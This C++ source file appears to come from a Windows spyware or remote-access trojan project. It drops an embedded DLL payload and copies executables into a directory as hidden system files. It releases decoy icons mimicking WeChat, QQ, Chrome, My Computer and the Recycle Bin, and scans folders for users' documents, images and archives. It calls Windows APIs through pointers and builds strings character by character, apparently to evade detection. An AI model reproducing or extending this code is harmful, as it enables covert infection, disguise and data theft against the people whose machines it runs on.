#include <string>
#include "PublicVar.h"
#include <windows.h>
#include "PublicFunc.h"
#include "BootAutoRun.h"
#include "network/NetWorkData.h"
#include <lmcons.h>
#include <io.h>
#include <lmat.h>
#include <LMErr.h>
#include "RegEditor.h"
#include <string>
#include <vector>

using namespace std;



DWORD ReleaseFile(char * szDstPath, char * filename, HMODULE lpThisDll)
{
	int iret = 0;
	char szShowInfo[1024];

	string dstFilename= string(szDstPath) + filename;

	//假设一个ico文件包含两个图标，那么你指定的图标ID对应的是在图标组RT_GROUP_ICON的资源ID，这里的数据是ico数据头，不包含图标数据，
	//但可以根据这里的数据得到它包含的两个图标在RT_ICON中的ID。所以你这个所应该使用的类型应该是RT_GROUP_ICON

	HRSRC hRes = lpFindResourceA(lpThisDll, (LPCSTR)DLLFIRSTLOAD, (LPCSTR)RT_RCDATA);
	if (hRes)
	{
		DWORD dwSize = lpSizeofResource(lpThisDll, hRes);
		HGLOBAL hGb = lpLoadResource(lpThisDll, hRes);
		if (hGb && dwSize)
		{
			LPVOID pData = lpLockResource(hGb);
			if (pData)
			{
				HANDLE hFile = lpCreateFileA((char*)dstFilename.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS,
					FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
				if (hFile != INVALID_HANDLE_VALUE)
				{
					DWORD dwCnt = 0;
					iret = lpWriteFile(hFile, (char*)pData, dwSize, &dwCnt, 0);
					lpCloseHandle(hFile);

					iret = lpSetFileAttributesA((char*)dstFilename.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

					return TRUE;
				}
			}
		}
	}

	iret = lpRtlGetLastWin32Error();
	lpwsprintfA(szShowInfo, "ReleaseIcon error code:%u\r\n", iret);
	WriteLittleBearLog(szShowInfo);
	
	return FALSE;
}


char * GetDocumentFileName(char * szDstBuf, char * szCurrentPath)
{
	char szAllFileForamt[] = { '*','.','*',0 };

	string strpath = string(szCurrentPath) + szAllFileForamt;

	WIN32_FIND_DATAA stWfd = { 0 };

	HANDLE hFind = lpFindFirstFileA((char*)strpath.c_str(), (LPWIN32_FIND_DATAA)&stWfd);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	char szLastDir[] = { '.','.',0 };
	do
	{

		if (stWfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (lplstrcmpiA(stWfd.cFileName, szLastDir) == 0 || lplstrcmpiA(stWfd.cFileName, ".") == 0)
			{
				continue;
			}
		}
		else
		{
			if (strstr(stWfd.cFileName, ".txt") || 
				strstr(stWfd.cFileName, ".pdf") || 
				strstr(stWfd.cFileName, ".docx") || 
				strstr(stWfd.cFileName, ".doc")|| 
				strstr(stWfd.cFileName, ".xlsx") || 
				strstr(stWfd.cFileName, ".xls")|| 
				strstr(stWfd.cFileName, ".png") || 
				strstr(stWfd.cFileName, ".jpg") || 
				strstr(stWfd.cFileName, ".jpeg") || 
				strstr(stWfd.cFileName, ".gif") || 
				strstr(stWfd.cFileName, ".bmp")|| 
				strstr(stWfd.cFileName, ".zip") || 
				strstr(stWfd.cFileName, ".rar")|| 
				strstr(stWfd.cFileName, ".avi") || 
				strstr(stWfd.cFileName, ".mp4") || 
				strstr(stWfd.cFileName, ".wmv") || 
				strstr(stWfd.cFileName, ".mp3") || 
				strstr(stWfd.cFileName, ".wav"))
			{
				lpFindClose(hFind);
				lplstrcpyA(szDstBuf, szCurrentPath);
				lplstrcatA(szDstBuf, stWfd.cFileName);
				return szDstBuf;
			}
		}
	} while (lpFindNextFileA(hFind, (LPWIN32_FIND_DATAA)&stWfd));
	lpFindClose(hFind);
	return FALSE;
}









int FindAndCopyFileIntoDstDir(char * pDstPath, char * szCurrentDir, char szDllName[MAX_DLL_COUNT][MAX_PATH], DWORD * iDllCnt)
{
	char szShowInfo[1024];

	if (*(pDstPath + lstrlenA(pDstPath) - 1) != '/' && *(pDstPath + lstrlenA(pDstPath) - 1) != '\\')
	{
		lplstrcatA(pDstPath, "\\");
	}

	if (*(szCurrentDir + lstrlenA(szCurrentDir) - 1) != '/' && *(szCurrentDir + lstrlenA(szCurrentDir) - 1) != '\\')
	{
		lplstrcatA(szCurrentDir, "\\");
	}

	char szAllFileForamt[] = { '*','.','*',0 };

	string searchpath = string(szCurrentDir) + szAllFileForamt;

	WIN32_FIND_DATAA stWfd = { 0 };
	HANDLE hFind = lpFindFirstFileA((char*)searchpath.c_str(), (LPWIN32_FIND_DATAA)&stWfd);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		lpwsprintfA(szShowInfo, "CopyFileToDstDir lpFindFirstFileA error,find path:%s,error code is:%u\r\n", 
			searchpath.c_str(),
			lpRtlGetLastWin32Error());
		WriteLittleBearLog(szShowInfo);
		return FALSE;
	}

	int iRet = 0;
	int iCnt = 0;
	*iDllCnt = 0;

	char szdllprefix[] = { '.','d','l','l',0 };
	char szexeprefix[] = { '.','e','x','e',0 };
	char szcomprefix[] = { '.','c','o','m',0 };
	char szLastDir[] = { '.','.',0 };
	do
	{
		if (stWfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (lplstrcmpiA(stWfd.cFileName, szLastDir) == 0 || lplstrcmpiA(stWfd.cFileName, ".") == 0)
			{
				continue;
			}
		}
		else if(stWfd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)
		{
			if (strstr(stWfd.cFileName, szdllprefix) || 
				strstr(stWfd.cFileName, szexeprefix) || 
				strstr(stWfd.cFileName, szcomprefix) ||
				strstr(stWfd.cFileName, "config.dat")||
				strstr(stWfd.cFileName, "flag.dat")||
				strstr(stWfd.cFileName, "test.dat"))
			{
				if (strstr(stWfd.cFileName, szdllprefix))
				{
					lplstrcpyA(szDllName[*iDllCnt], pDstPath);
					lplstrcatA(szDllName[*iDllCnt], stWfd.cFileName);
					*iDllCnt += 1;
				}

				string dstfn = string(pDstPath) + stWfd.cFileName;
				string srcfn = string(szCurrentDir) + stWfd.cFileName;
				if (_access(dstfn.c_str(),0) == 0)
				{
					continue;
				}

				iRet = lpCopyFileA((char*)srcfn.c_str(), (char*)dstfn.c_str(), FALSE);		
				//movefile can not movefile between different disk
				if (iRet == 0)
				{
					iRet = lpRtlGetLastWin32Error();
					lpwsprintfA(szShowInfo, "CopyFileToDstDir copyfile:%s error,the errorcode is:%u\r\n", stWfd.cFileName, iRet);
					WriteLittleBearLog(szShowInfo);
				}
				else
				{
					lpwsprintfA(szShowInfo, "CopyFileToDstDir copyfile:%s ok\r\n", stWfd.cFileName);
					WriteLittleBearLog(szShowInfo);
					iCnt++;

					iRet = lpSetFileAttributesA((char*)dstfn.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
				}
			}
		}
	} while (lpFindNextFileA(hFind, (LPWIN32_FIND_DATAA)&stWfd));

	lpFindClose(hFind);

	return iCnt;
}








DWORD ReleaseIcon(char * szDstPath, HMODULE lpThisDll)
{
	int iret = 0;

	char szFileName[MAX_ICON_COUNT][MAX_PATH] = { 0 };
	char szWechatIconName[] = { 'w','e','c','h','a','t','.','i','c','o',0 };
	char szQQIconName[] = { 'q','q','.','i','c','o',0 };
	char szMycomputerWin10IconName[] = { 'c','o','m','p','u','t','e','r','w','i','n','1','0','.','i','c','o',0 };
	char szMycomputerIconName[] = { 'c','o','m','p','u','t','e','r','.','i','c','o',0 };
	char szMycomputerXPIconName[] = { 'c','o','m','p','u','t','e','r','x','p','.','i','c','o',0 };
	char szEdgeIconName[] = { 'e','d','g','e','.','i','c','o',0 };
	char szIEIconName[] = { 'i','e','.','i','c','o',0 };
	char szRecycleWin10IconName[] = { 'r','e','c','y','c','l','e','w','i','n','1','0','.','i','c','o',0 };
	char szRecycleWin7IconName[] = { 'r','e','c','y','c','l','e','w','i','n','7','.','i','c','o',0 };
	char szFireFoxIconName[] = { 'f','i','r','e','f','o','x','.','i','c','o',0 };
	char szChromeIconName[] = { 'c','h','r','o','m','e','.','i','c','o',0 };

	lstrcpyA(szFileName[0], szWechatIconName);
	lstrcpyA(szFileName[1], szQQIconName);
	lstrcpyA(szFileName[2], szMycomputerWin10IconName);
	lstrcpyA(szFileName[3], szMycomputerIconName);
	lstrcpyA(szFileName[4], szMycomputerXPIconName);
	lstrcpyA(szFileName[5],szEdgeIconName);
	lstrcpyA(szFileName[6], szIEIconName);
	lstrcpyA(szFileName[7], szRecycleWin10IconName);
	lstrcpyA(szFileName[8], szRecycleWin7IconName);
	lstrcpyA(szFileName[9], szFireFoxIconName);
	lstrcpyA(szFileName[10], szChromeIconName);

	DWORD dwResourceID[MAX_ICON_COUNT] = { 0 };
	dwResourceID[0] = ICON_WECHAT;
	dwResourceID[1] = ICON_QQ;
	dwResourceID[2] = ICON_MYCOMPUTERWIN10;
	dwResourceID[3] = ICON_MYCOMPUTER;
	dwResourceID[4] = ICON_MYCOMPUTERXP;
	//dwResourceID[5] = ICON_EDGE;
	dwResourceID[6] = ICON_IE;
	dwResourceID[7] = ICON_RECYCLEWIN10;
	dwResourceID[8] = ICON_RECYCLEWIN7;
	dwResourceID[9] = ICON_FIREFOX;
	dwResourceID[10] = ICON_CHROME;

	for (int i = 0; i < MAX_ICON_COUNT; i++)
	{
		if (*szFileName[i])
		{
			string dstIconPath = string(szDstPath) + szFileName[i];
			if (_access(dstIconPath.c_str(), 0) == 0)
			{
				continue;
			}

			//假设一个ico文件包含两个图标，那么你指定的图标ID对应的是在图标组RT_GROUP_ICON的资源ID，这里的数据是ico数据头，不包含图标数据，
			//但可以根据这里的数据得到它包含的两个图标在RT_ICON中的ID。所以你这个所应该使用的类型应该是RT_GROUP_ICON

			HRSRC hRes = lpFindResourceA(lpThisDll, (LPCSTR)dwResourceID[i], (LPCSTR)RT_RCDATA);
			if (hRes)
			{
				DWORD dwSize = lpSizeofResource(lpThisDll, hRes);
				HGLOBAL hGb = lpLoadResource(lpThisDll, hRes);
				if (hGb)
				{
					LPVOID pData = lpLockResource(hGb);
					if (pData)
					{
						HANDLE hFile = lpCreateFileA((char*)dstIconPath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS,
							FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
						if (hFile != INVALID_HANDLE_VALUE)
						{
							DWORD dwCnt = 0;
							iret = lpWriteFile(hFile, (char*)pData, dwSize, &dwCnt, 0);
							lpCloseHandle(hFile);

							iret = lpSetFileAttributesA((char*)dstIconPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
						}
					}
				}
			}
		}
	}

	return TRUE;
}


vector<string> splitstr(string str,string sep) {

	vector<string> result;

	int start = 0;
	int end = 0;
	while (1)
	{
		int end = str.find(sep,start);
		if (end >= 0)
		{
			string item = str.substr(start, end - start);
			result.push_back(item);

			start = end + sep.length();
		}
		else {
			break;
		}
	}

	return result;
}



void replaceSplash(string & str) {
	int len = str.length();
	for (int i = 0; i < len; i++)
	{
		if (str.at(i) == '\\')
		{
			str.at(i) = '/';
		}
	}
}

void replaceSplashAndEnter(string & str) {

	for (int i = 0; i < str.length(); )
	{
		if (str.at(i) == '\\')
		{
			str.at(i) = '/';
			i++;
		}
		else if (str.at(i) == '\r' || str.at(i) == '\n')
		{
			str = str.replace(i, 1, "");
		}
		else {
			i++;
		}
	}
}


int UTF8ToGBK(const char* utf8, char ** lpdatabuf)
{
	if (lpdatabuf <= 0)
	{
		return FALSE;
	}
	int needunicodelen = MultiByteToWideChar(CP_UTF8, 0, utf8, -1, NULL, 0);
	if (needunicodelen <= 0)
	{
		//WriteLogFile("UTF8ToGBK MultiByteToWideChar get len error\r\n");
		*lpdatabuf = 0;
		return FALSE;
	}
	//needunicodelen *= 2;
	needunicodelen += 1024;
	wchar_t* wstr = new wchar_t[needunicodelen];
	memset(wstr, 0, 2 * (needunicodelen));
	int unicodelen = MultiByteToWideChar(CP_UTF8, 0, utf8, -1, wstr, needunicodelen);
	if (unicodelen <= 0)
	{
		//WriteLogFile("UTF8ToGBK MultiByteToWideChar error\r\n");
		*lpdatabuf = 0;
		delete[] wstr;
		return FALSE;
	}
	*(int*)(wstr + unicodelen) = 0;
	int needgbklen = WideCharToMultiByte(CP_ACP, 0, wstr, -1, NULL, 0, NULL, NULL);
	if (needgbklen <= 0)
	{
		//WriteLogFile("UTF8ToGBK WideCharToMultiByte get len error\r\n");
		*lpdatabuf = 0;
		delete[] wstr;
		return FALSE;
	}
	needgbklen += 1024;
	*lpdatabuf = new char[needgbklen];
	memset(*lpdatabuf, 0, needgbklen);

	int gbklen = WideCharToMultiByte(CP_ACP, 0, wstr, -1, *lpdatabuf, needgbklen, NULL, NULL);
	delete[] wstr;
	if (gbklen <= 0)
	{
		//WriteLogFile("UTF8ToGBK WideCharToMultiByte error\r\n");
		delete[](*lpdatabuf);
		*lpdatabuf = 0;
		return FALSE;
	}

	*(*lpdatabuf + gbklen) = 0;
	return gbklen;
}



int GBKToUTF8(const char* gb2312, char ** lpdatabuf)
{
	if (lpdatabuf <= 0)
	{
		return FALSE;
	}
	int needunicodelen = MultiByteToWideChar(CP_ACP, 0, gb2312, -1, NULL, 0);
	if (needunicodelen <= 0)
	{
		//WriteLogFile("GBKToUTF8 MultiByteToWideChar get len error\r\n");
		*lpdatabuf = 0;
		return FALSE;
	}
	//needunicodelen *= 2;
	needunicodelen += 1024;
	wchar_t* wstr = new wchar_t[needunicodelen];
	memset(wstr, 0, 2 * (needunicodelen));
	int unicodelen = MultiByteToWideChar(CP_ACP, 0, gb2312, -1, wstr, needunicodelen);
	if (unicodelen <= 0)
	{
		//WriteLogFile("GBKToUTF8 MultiByteToWideChar error\r\n");
		*lpdatabuf = 0;
		delete[] wstr;
		return FALSE;
	}
	*(int*)(wstr + unicodelen) = 0;
	int needutf8len = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
	if (needutf8len <= 0)
	{
		//WriteLogFile("GBKToUTF8 WideCharToMultiByte get len error\r\n");
		*lpdatabuf = 0;
		delete[] wstr;
		return FALSE;
	}
	needutf8len += 1024;
	*lpdatabuf = new char[needutf8len];
	memset(*lpdatabuf, 0, needutf8len);
	int utf8len = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, *lpdatabuf, needutf8len, NULL, NULL);
	delete[] wstr;
	if (utf8len <= 0)
	{
		//WriteLogFile("GBKToUTF8 WideCharToMultiByte error\r\n");
		delete *lpdatabuf;
		*lpdatabuf = 0;
		return FALSE;
	}

	*(*lpdatabuf + utf8len) = 0;
	return utf8len;
}




string makeJsonFromTxt(char * utf) {
	char * gbk = 0;
	int gbklen = UTF8ToGBK(utf, &gbk);
	if (gbklen > 0)
	{
		char * strjson = new char[gbklen + 1024];
		sprintf(strjson, "{\"key\":\"%s\"}", gbk);
		delete gbk;

		Json::Value value;
		Json::Reader reader;
		int ret = reader.parse(strjson, value);
		delete strjson;
		if (ret)
		{
			string strvalue = value["key"].asString();

			while (1)
			{
				int pos = strvalue.find("&gt;");
				if (pos >= 0)
				{
					strvalue = strvalue.replace(pos, 4, ">");
				}
				else {
					pos = strvalue.find("\r");
					if (pos >= 0)
					{
						strvalue = strvalue.replace(pos, 1, "");
					}
					else {
						pos = strvalue.find("\n");
						if (pos >= 0)
						{
							strvalue = strvalue.replace(pos, 1, "");
						}
						else {
							break;
						}
					}
				}
			}

			return strvalue;
		}
	}

	return "";
}